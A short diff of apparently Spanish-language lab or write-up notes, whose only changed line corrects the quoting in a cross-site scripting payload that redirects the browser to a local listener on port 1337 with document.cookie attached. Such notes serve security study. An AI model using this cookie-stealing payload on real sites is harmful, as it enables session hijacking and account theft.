@@ -6,7 +6,7 @@ _Contaminación de Lote en Cadena de Suministro_: Un producto manufacturado es a
 
 
 ```
-<script>window.location='http://127.0.0.1:1337//?cookie="+document.cookie</script>
+<script>window.location="http://127.0.0.1:1337/?cookie="+document.cookie</script>
 ```
 
 ![Pasted ima7](../images/Pasted%20image%2020251204022932.png)        
